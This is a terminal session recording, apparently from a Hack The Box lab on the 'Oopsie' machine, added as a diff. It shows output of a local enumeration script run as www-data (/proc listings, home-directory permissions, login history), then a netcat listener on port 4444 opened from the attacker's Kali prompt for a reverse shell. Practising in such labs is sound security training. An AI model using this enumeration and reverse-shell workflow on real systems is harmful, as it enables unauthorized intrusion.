+/proc/2893/timers
+/proc/2893/timerslack_ns
+/proc/2893/patch_state
+/proc/3027
+/proc/3027/task
+/proc/3027/task/3027
+/proc/3027/task/3027/fd
+/proc/3027/task/3027/fd/0
+/proc/3027/task/3027/fd/1
+/proc/3027/task/3027/fd/2
+/proc/3027/task/3027/fd/3
+/proc/3027/task/3027/fd/4
+/proc/3027/task/3027/fd/5
+/proc/3027/task/3027/fd/7
+/proc/3027/task/3027/fd/8
+/proc/3027/task/3027/fd/9
+/proc/3027/task/3027/fd/10
+/proc/3027/task/3027/fd/12
+/proc/3027/task/3027/fdinfo
+/proc/3027/task/3027/fdinfo/0
+/proc/3027/task/3027/fdinfo/1
+/proc/3027/task/3027/fdinfo/2
+/proc/3027/task/3027/fdinfo/3
+/proc/3027/task/3027/fdinfo/4
+/proc/3027/task/3027/fdinfo/5
+/proc/3027/task/3027/fdinfo/7
+/proc/3027/task/3027/fdinfo/8
+/proc/3027/task/3027/fdinfo/9
+/proc/3027/task/3027/fdinfo/10
+/proc/3027/task/3027/fdinfo/12
+/proc/3027/task/3027/ns
+/proc/3027/task/3027/ns/net
+/proc/3027/task/3027/ns/uts
+/proc/3027/task/3027/ns/ipc
+/proc/3027/task/3027/ns/pid
+/proc/3027/task/3027/ns/pid_for_children
+/proc/3027/task/3027/ns/user
+/proc/3027/task/3027/ns/mnt
+/proc/3027/task/3027/ns/cgroup
+/proc/3027/task/3027/net
+/proc/3027/task/3027/environ
+/proc/3027/task/3027/auxv
+/proc/3027/task/3027/status
+/proc/3027/task/3027/personality
+/proc/3027/task/3027/limits
+/proc/3027/task/3027/sched
+/proc/3027/task/3027/comm
+/proc/3027/task/3027/syscall
+/proc/3027/task/3027/cmdline
+/proc/3027/task/3027/stat
+/proc/3027/task/3027/statm
+/proc/3027/task/3027/maps
+/proc/3027/task/3027/children
+/proc/3027/task/3027/numa_maps
+/proc/3027/task/3027/mem
+/proc/3027/task/3027/cwd
+/proc/3027/task/3027/root
+/proc/3027/task/3027/exe
+/proc/3027/task/3027/mounts
+/proc/3027/task/3027/mountinfo
+/proc/3027/task/3027/clear_refs
+/proc/3027/task/3027/smaps
+/proc/3027/task/3027/smaps_rollup
+/proc/3027/task/3027/pagemap
+/proc/3027/task/3027/attr
+/proc/3027/task/3027/attr/current
+/proc/3027/task/3027/attr/prev
+/proc/3027/task/3027/attr/exec
+/proc/3027/task/3027/attr/fscreate
+/proc/3027/task/3027/attr/keycreate
+/proc/3027/task/3027/attr/sockcreate
+/proc/3027/task/3027/attr/display_lsm
+/proc/3027/task/3027/attr/selinux
+/proc/3027/task/3027/attr/selinux/current
+/proc/3027/task/3027/attr/selinux/prev
+/proc/3027/task/3027/attr/selinux/exec
+/proc/3027/task/3027/attr/selinux/fscreate
+/proc/3027/task/3027/attr/selinux/keycreate
+/proc/3027/task/3027/attr/selinux/sockcreate
+/proc/3027/task/3027/attr/smack
+/proc/3027/task/3027/attr/smack/current
+/proc/3027/task/3027/attr/apparmor
+/proc/3027/task/3027/attr/apparmor/current
+/proc/3027/task/3027/attr/apparmor/prev
+/proc/3027/task/3027/attr/apparmor/exec
+/proc/3027/task/3027/wchan
+/proc/3027/task/3027/stack
+/proc/3027/task/3027/schedstat
+/proc/3027/task/3027/cpuset
+/proc/3027/task/3027/cgroup
+/proc/3027/task/3027/oom_score
+/proc/3027/task/3027/oom_adj
+/proc/3027/task/3027/oom_score_adj
+/proc/3027/task/3027/loginuid
+/proc/3027/task/3027/sessionid
+/proc/3027/task/3027/io
+/proc/3027/task/3027/uid_map
+/proc/3027/task/3027/gid_map
+/proc/3027/task/3027/projid_map
+/proc/3027/task/3027/setgroups
+/proc/3027/task/3027/patch_state
+/proc/3027/fd
+/proc/3027/fd/0
+/proc/3027/fd/1
+/proc/3027/fd/2
+/proc/3027/fd/3
+/proc/3027/fd/4
+/proc/3027/fd/6
+/proc/3027/fd/7
+/proc/3027/fd/12
+/proc/3027/map_files
+/proc/3027/map_files/555af0a31000-555af0a69000
+/proc/3027/map_files/555af0c68000-555af0c6a000
+/proc/3027/map_files/555af0c6a000-555af0c6b000
+/proc/3027/map_files/7f07998c6000-7f07998d1000
+/proc/3027/map_files/7f07998d1000-7f0799ad0000
+/proc/3027/map_files/7f0799ad0000-7f0799ad1000
+/proc/3027/map_files/7f0799ad1000-7f0799ad2000
+/proc/3027/map_files/7f0799ad8000-7f0799aef000
+/proc/3027/map_files/7f0799aef000-7f0799cee000
+/proc/3027/map_files/7f0799cee000-7f0799cef000
+/proc/3027/map_files/7f0799cef000-7f0799cf0000
+/proc/3027/map_files/7f0799cf2000-7f0799cfd000
+/proc/3027/map_files/7f0799cfd000-7f0799efc000
+/proc/3027/map_files/7f0799efc000-7f0799efd000
+/proc/3027/map_files/7f0799efd000-7f0799efe000
+/proc/3027/map_files/7f0799efe000-7f0799f06000
+/proc/3027/map_files/7f0799f06000-7f079a106000
+/proc/3027/map_files/7f079a106000-7f079a107000
+/proc/3027/map_files/7f079a107000-7f079a108000
+/proc/3027/map_files/7f079a108000-7f079a122000
+/proc/3027/map_files/7f079a122000-7f079a321000
+/proc/3027/map_files/7f079a321000-7f079a322000
+/proc/3027/map_files/7f079a322000-7f079a323000
+/proc/3027/map_files/7f079a327000-7f079a32a000
+/proc/3027/map_files/7f079a32a000-7f079a529000
+/proc/3027/map_files/7f079a529000-7f079a52a000
+/proc/3027/map_files/7f079a52a000-7f079a52b000
+/proc/3027/map_files/7f079a52b000-7f079a59b000
+/proc/3027/map_files/7f079a59b000-7f079a79b000
+/proc/3027/map_files/7f079a79b000-7f079a79c000
+/proc/3027/map_files/7f079a79c000-7f079a79d000
+/proc/3027/map_files/7f079a79d000-7f079a984000
+/proc/3027/map_files/7f079a984000-7f079ab84000
+/proc/3027/map_files/7f079ab84000-7f079ab88000
+/proc/3027/map_files/7f079ab88000-7f079ab8a000
+/proc/3027/map_files/7f079ab8e000-7f079ad2b000
+/proc/3027/map_files/7f079ad2b000-7f079af2a000
+/proc/3027/map_files/7f079af2a000-7f079af2b000
+/proc/3027/map_files/7f079af2b000-7f079af2c000
+/proc/3027/map_files/7f079af2c000-7f079af51000
+/proc/3027/map_files/7f079af51000-7f079b150000
+/proc/3027/map_files/7f079b150000-7f079b151000
+/proc/3027/map_files/7f079b151000-7f079b152000
+/proc/3027/map_files/7f079b154000-7f079b17b000
+/proc/3027/map_files/7f079b37b000-7f079b37c000
+/proc/3027/map_files/7f079b37c000-7f079b37d000
+/proc/3027/fdinfo
+/proc/3027/fdinfo/0
+/proc/3027/fdinfo/1
+/proc/3027/fdinfo/2
+/proc/3027/fdinfo/3
+/proc/3027/fdinfo/4
+/proc/3027/fdinfo/6
+/proc/3027/fdinfo/7
+/proc/3027/fdinfo/12
+/proc/3027/ns
+/proc/3027/ns/net
+/proc/3027/ns/uts
+/proc/3027/ns/ipc
+/proc/3027/ns/pid
+/proc/3027/ns/pid_for_children
+/proc/3027/ns/user
+/proc/3027/ns/mnt
+/proc/3027/ns/cgroup
+/proc/3027/net
+/proc/3027/environ
+/proc/3027/auxv
+/proc/3027/status
+/proc/3027/personality
+/proc/3027/limits
+/proc/3027/sched
+/proc/3027/autogroup
+/proc/3027/comm
+/proc/3027/syscall
+/proc/3027/cmdline
+/proc/3027/stat
+/proc/3027/statm
+/proc/3027/maps
+/proc/3027/numa_maps
+/proc/3027/mem
+/proc/3027/cwd
+/proc/3027/root
+/proc/3027/exe
+/proc/3027/mounts
+/proc/3027/mountinfo
+/proc/3027/mountstats
+/proc/3027/clear_refs
+/proc/3027/smaps
+/proc/3027/smaps_rollup
+/proc/3027/pagemap
+/proc/3027/attr
+/proc/3027/attr/current
+/proc/3027/attr/prev
+/proc/3027/attr/exec
+/proc/3027/attr/fscreate
+/proc/3027/attr/keycreate
+/proc/3027/attr/sockcreate
+/proc/3027/attr/display_lsm
+/proc/3027/attr/selinux
+/proc/3027/attr/selinux/current
+/proc/3027/attr/selinux/prev
+/proc/3027/attr/selinux/exec
+/proc/3027/attr/selinux/fscreate
+/proc/3027/attr/selinux/keycreate
+/proc/3027/attr/selinux/sockcreate
+/proc/3027/attr/smack
+/proc/3027/attr/smack/current
+/proc/3027/attr/apparmor
+/proc/3027/attr/apparmor/current
+/proc/3027/attr/apparmor/prev
+/proc/3027/attr/apparmor/exec
+/proc/3027/wchan
+/proc/3027/stack
+/proc/3027/schedstat
+/proc/3027/cpuset
+/proc/3027/cgroup
+/proc/3027/oom_score
+/proc/3027/oom_adj
+/proc/3027/oom_score_adj
+/proc/3027/loginuid
+/proc/3027/sessionid
+/proc/3027/coredump_filter
+/proc/3027/io
+/proc/3027/uid_map
+/proc/3027/gid_map
+/proc/3027/projid_map
+/proc/3027/setgroups
+/proc/3027/timers
+/proc/3027/timerslack_ns
+/proc/3027/patch_state
+/tmp/linux-local-enum.sh
+/tmp/enum.log
+/var/cache/apache2/mod_cache_disk
+/run/lock/apache2
+
+tput: No value for $TERM and no -T specified
+
+##
+##  /home and /root Permissions
+##
+tput: No value for $TERM and no -T specified
+
+
+/home/:
+total 12K
+drwxr-xr-x  3 root   root   4.0K Jul 28  2021 .
+drwxr-xr-x 24 root   root   4.0K Oct 11  2021 ..
+drwxr-xr-x  3 robert robert 4.0K Jul 28  2021 robert
+
+/home/robert:
+total 28K
+drwxr-xr-x 3 robert robert 4.0K Jul 28  2021 .
+drwxr-xr-x 3 root   root   4.0K Jul 28  2021 ..
+lrwxrwxrwx 1 robert robert    9 Jan 25  2020 .bash_history -> /dev/null
+-rw-r--r-- 1 robert robert  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 robert robert 3.7K Apr  4  2018 .bashrc
+drwx------ 3 robert robert 4.0K Jul 28  2021 .gnupg
+-rw-r--r-- 1 robert robert  807 Apr  4  2018 .profile
+-rw-r--r-- 1 robert robert   33 Feb 25  2020 user.txt
+/bin/ls: cannot open directory '/home/robert/.gnupg': Permission denied
+/bin/ls: cannot open directory '/root/': Permission denied
+
+tput: No value for $TERM and no -T specified
+
+##
+##  Logged on Users
+##
+tput: No value for $TERM and no -T specified
+
+
+ 10:40:23 up  2:52,  0 users,  load average: 0.08, 0.02, 0.01
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+
+tput: No value for $TERM and no -T specified
+
+##
+##  Last Logged on Users
+##
+tput: No value for $TERM and no -T specified
+
+
+reboot   system boot  4.15.0-76-generi Thu Oct 24 07:47   still running
+root     tty1                          Mon Oct 11 12:53 - down   (00:05)
+reboot   system boot  4.15.0-76-generi Mon Oct 11 09:46 - 12:58  (03:12)
+root     pts/0        10.10.14.13      Wed Jul 28 07:02 - crash (75+02:43)
+reboot   system boot  4.15.0-76-generi Wed Jul 28 07:01 - 12:58 (75+05:56)
+reboot   system boot  4.15.0-76-generi Wed Jul 28 06:16 - 12:58 (75+06:42)
+root     pts/0        10.10.14.13      Wed Jul 28 06:12 - 06:16  (00:03)
+reboot   system boot  4.15.0-76-generi Wed Jul 28 06:09 - 06:16  (00:06)
+root     pts/0        10.10.14.2       Thu Apr 15 11:33 - 12:20  (00:47)
+reboot   system boot  4.15.0-76-generi Thu Apr 15 11:31 - 06:16 (103+18:44)
+root     tty1                          Fri Sep 11 11:28 - 11:31  (00:02)
+reboot   system boot  4.15.0-76-generi Fri Sep 11 11:27 - 11:31  (00:04)
+reboot   system boot  4.15.0-76-generi Fri Sep 11 11:23 - 11:24  (00:01)
+reboot   system boot  4.15.0-76-generi Fri Mar 20 13:34 - 13:52  (00:18)
+root     tty1                          Fri Mar 20 13:32 - down   (00:00)
+reboot   system boot  4.15.0-76-generi Fri Mar 20 13:31 - 13:32  (00:00)
+root     tty1                          Fri Mar 20 13:30 - down   (00:01)
+reboot   system boot  4.15.0-76-generi Fri Mar 20 13:29 - 13:31  (00:02)
+root     tty1                          Fri Mar 20 12:36 - down   (00:03)
+reboot   system boot  4.15.0-76-generi Fri Mar 20 12:28 - 12:39  (00:11)
+root     tty1                          Tue Feb 25 14:18 - down   (00:08)
+reboot   system boot  4.15.0-76-generi Tue Feb 25 13:52 - 14:27  (00:34)
+reboot   system boot  4.15.0-76-generi Tue Jan 28 14:22 - 14:29  (00:06)
+root     tty1                          Tue Jan 28 14:15 - down   (00:07)
+reboot   system boot  4.15.0-76-generi Tue Jan 28 13:53 - 14:22  (00:29)
+reboot   system boot  4.15.0-76-generi Tue Jan 28 13:27 - 13:51  (00:23)
+reboot   system boot  4.15.0-76-generi Mon Jan 27 23:11 - 13:27  (14:15)
+reboot   system boot  4.15.0-76-generi Mon Jan 27 23:08 - 23:11  (00:02)
+root     tty1                          Mon Jan 27 23:01 - down   (00:06)
+reboot   system boot  4.15.0-76-generi Mon Jan 27 22:56 - 23:08  (00:12)
+root     tty1                          Mon Jan 27 22:34 - down   (00:21)
+reboot   system boot  4.15.0-74-generi Mon Jan 27 22:33 - 22:56  (00:23)
+root     tty1                          Mon Jan 27 22:19 - down   (00:13)
+reboot   system boot  4.15.0-74-gene
+
+
+
+
+
+
+
+www-data@oopsie:/tmp$ 
+www-data@oopsie:/tmp$ 
+www-data@oopsie:/tmp$ 
+www-data@oopsie:/tmp$ 
+www-data@oopsie:/tmp$ 
+www-data@oopsie:/tmp$ 
+www-data@oopsie:/tmp$ ^C
+                                                                                                                              ]0;root@kali: ~/Desktop/HTB/Oopsie
+[0m[27m[24m[J[34m┌──([1m[34m[31mroot㉿kali[0m[31m[34m)-[[1m[34m[39m~/Desktop/HTB/Oopsie[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[?1h=[?2004h[?2004l
+                                                                                                                              ]0;root@kali: ~/Desktop/HTB/Oopsie
+[0m[27m[24m[J[34m┌──([1m[34m[31mroot㉿kali[0m[31m[34m)-[[1m[34m[39m~/Desktop/HTB/Oopsie[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[?1h=[?2004h[36mw[39m[36mw[39m[38;2;153;153;153mhere run-vscode[39m[15D[39m[1mw[39m[1me[0m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [14D[1mw[1me[1mb[0m[1mw[1me[0m[0m [0m[36mw[39m[0m [36mw[39m[38;2;153;153;153mhere run-vscode[39m[15D[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [16D[36mnc[39m [32m-nlvp[39m  4444[?1l>[?2004l
+listening on [any] 4444 ...
+^C
+                                                                                                                              ]0;root@kali: ~/Desktop/HTB/Oopsie
+[0m[27m[24m[J[34m┌──([1m[34m[31mroot㉿kali[0m[31m[34m)-[[1m[34m[39m~/Desktop/HTB/Oopsie[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[?1h=[?2004h[?2004l
+                                                                                                                              ]0;root@kali: ~/Desktop/HTB/Oopsie
+[0m[27m[24m[J[34m┌──([1m[34m[31mroot㉿kali[0m[31m[34m)-[[1m[34m[39m~/Desktop/HTB/Oopsie[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[?1h=[?2004h[?2004l
+                                                                                                                              ]0;root@kali: ~/Desktop/HTB/Oopsie
+[0m[27m[24m[J[34m┌──([1m[34m[31mroot㉿kali[0m[31m[34m)-[[1m[34m[39m~/Desktop/HTB/Oopsie[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[?1h=[?2004h[?2004l
+                                                                                                                              ]0;root@kali: ~/Desktop/HTB/Oopsie
+[0m[27m[24m[J[34m┌──([1m[34m[31mroot㉿kali[0m[31m[34m)-[[1m[34m[39m~/Desktop/HTB/Oopsie[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[?1h=[?2004h[?2004l
+                                                                                                                              ]0;root@kali: ~/Desktop/HTB/Oopsie
+[0m[27m[24m[J[34m┌──([1m[34m[31mroot㉿kali[0m[31m[34m)-[[1m[34m[39m~/Desktop/HTB/Oopsie[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[?1h=[?2004h[4me[24m[4me[24m[38;2;153;153;153mxit[39m[4me[39m[4ms[24m[39m [39m [38;2;153;153;153mit[39m[4me[4ms[39m[4mx[24m[39m [4mx[4mi[24m[4mi[4mt[24m[4mi[24m[24m [4mx[24m[24m [4me[4ms[24m[24m [38;2;153;153;153mit[39m[4me[24m[24m [39m [39m [4me[24m[38;2;153;153;153mxit[39m[24m[36me[36mx[39m[39m[4me[39m[4mx[39m[4mi[24m[24m[36me[24m[36mx[24m[36mi[36mt[39m[?1l>[?2004l
+
+Script done on 2024-10-24 06:45:28-04:00 [COMMAND_EXIT_CODE="130"]
